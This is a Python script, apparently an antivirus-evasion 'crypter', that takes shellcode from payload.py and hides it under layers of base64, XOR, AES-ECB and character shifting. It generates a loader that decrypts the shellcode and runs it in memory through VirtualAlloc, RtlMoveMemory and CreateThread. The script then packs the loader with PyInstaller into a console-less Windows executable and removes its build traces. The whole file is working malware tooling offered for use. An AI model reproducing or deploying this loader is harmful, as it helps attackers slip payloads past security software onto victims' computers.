# -*- coding: UTF-8 -*-
# @Time:  13:53
# @Author: 浪飒
# @File: Bypass.py
# @Software: PyCharm
import os
import shutil

import PyInstaller.__main__

import base64
import time

from Crypto.Cipher import AES


def en_bs64():
    shellcode = open('payload.py')
    shellcode = shellcode.read()
    # 取出shellcode内容
    s1 = shellcode.find("\"") + 1
    s2 = shellcode.rfind("\"")
    shellcode = shellcode[s1:s2]
    shellcode = str(base64.b64encode(shellcode.encode('UTF-8')), 'UTF-8')
    return shellcode


def en_xor(s, key):
    xor_s = ''
    for i in s:
        xor_s += chr(ord(i) ^ key)
    return xor_s


def en_key():
    key = time.strftime("%d", time.localtime())
    if key not in range(0, 25):
        key = 18
    else:
        key = time.strftime("%d", time.localtime())
    return key


def add_to_16(s):
    while len(s) % 16 != 0:
        s += '\0'
    return str.encode(s)  # 返回bytes


def aes_key():
    key = en_key()
    key = str(key) + "LeslieCheungKwol13d"
    return key


def en_aes(text):
    # 密钥长度必须为16、24或32位，分别对应AES-128、AES-192和AES-256
    key = aes_key()
    aes = AES.new(add_to_16(key), AES.MODE_ECB)
    encrypted_text = str(base64.encodebytes(aes.encrypt(add_to_16(text))), encoding='utf8').replace('\n', '')
    return encrypted_text


def encryptMessage(key, message):
    return ''.join([chr(ord(c) + key) for c in message])


def en_all():
    key = en_key()
    en_bs64_text = en_bs64()
    en_xor_text = en_xor(en_bs64_text, key)
    en_aes_text = en_aes(en_xor_text)
    en_wy_text = encryptMessage(key, en_aes_text)
    en_bs64_text = str(base64.b64encode(en_wy_text.encode('UTF-8')), 'UTF-8')
    en_aes_text = en_aes(en_bs64_text)
    return en_aes_text


if __name__ == '__main__':
    shellcode = en_all()
    file = open('catch.py', 'w', encoding="utf-8")
    file.write("""
# -*- coding: utf-8 -*-
import ctypes
import base64
import codecs
import time

from Crypto.Cipher import AES

def en_xor(s, key):
    xor_s = ''
    for i in s:
        xor_s += chr(ord(i) ^ key)
    return xor_s


def en_key():
    key = time.strftime("%d", time.localtime())
    if key not in range(0, 25):
        key = 18
    else:
        key = time.strftime("%d", time.localtime())
    return key


def add_to_16(s):
    while len(s) % 16 != 0:
        s += '\\0'
    return str.encode(s)  # 返回bytes

def aes_key():
    key = en_key()
    key = str(key) + "LeslieCheungKwol13d"
    return key

def decryptMessage(key, message):
    return ''.join([chr(ord(c)-key) for c in message])

def de_aes(s):
    key = aes_key()
    cipher = AES.new(add_to_16(key), AES.MODE_ECB)
    return cipher.decrypt(base64.decodebytes(bytes(s, encoding='utf8'))).rstrip(b'\\0').decode("utf8")


def de_bs64(shellcode):
    shellcode = base64.b64decode(shellcode)
    shellcode = codecs.escape_decode(shellcode)[0]
    return shellcode

def de_all(text):
    key = en_key()
    de_aes_text = de_aes(text)
    de_bs64_text = str(base64.b64decode(de_aes_text.encode('UTF-8')), 'UTF-8')
    de_wy_text = decryptMessage(key,de_bs64_text)
    de_aes_text = de_aes(de_wy_text)
    de_xor_text = en_xor(de_aes_text,key)
    de_bs64_text = de_bs64(de_xor_text)
    return de_bs64_text

def run(shellcode):
    shellcode = bytearray(shellcode)
    # 设置VirtualAlloc返回类型为ctypes.c_uint64
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    # 申请内存
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))

    # 放入shellcode
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_uint64(ptr),
        buf,
        ctypes.c_int(len(shellcode))
    )
    # 创建一个线程从shellcode防止位置首地址开始执行
    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_uint64(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )
    # 等待上面创建的线程运行完
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))


if __name__ == '__main__':
    shellcode = \"""" + shellcode + '\"' + """
    shellcode = de_all(shellcode)
    run(shellcode)""")
    file.close()
    try:
        # 获取要打包的脚本路径
        script_file = "catch.py"
        # 获取 PyInstaller 路径
        pyinstaller_path = os.path.dirname(PyInstaller.__main__.__file__)
        # 设置打包选项
        build_args = [
            "--onefile",  # 生成一个单独的可执行文件
            "--noconsole",  # 不显示命令行窗口
            "--name=langsa",  # 设置生成的可执行文件名
            script_file  # 添加要打包的脚本路径
        ]
        # 执行打包命令
        PyInstaller.__main__.run(build_args)
    except:
        print("快看下exe打包好了没,在dist文件夹下")
    # 删除 build 文件夹和.spec文件
    shutil.rmtree("./build")
    os.remove("./langsa.spec")
    os.remove("./catch.py")
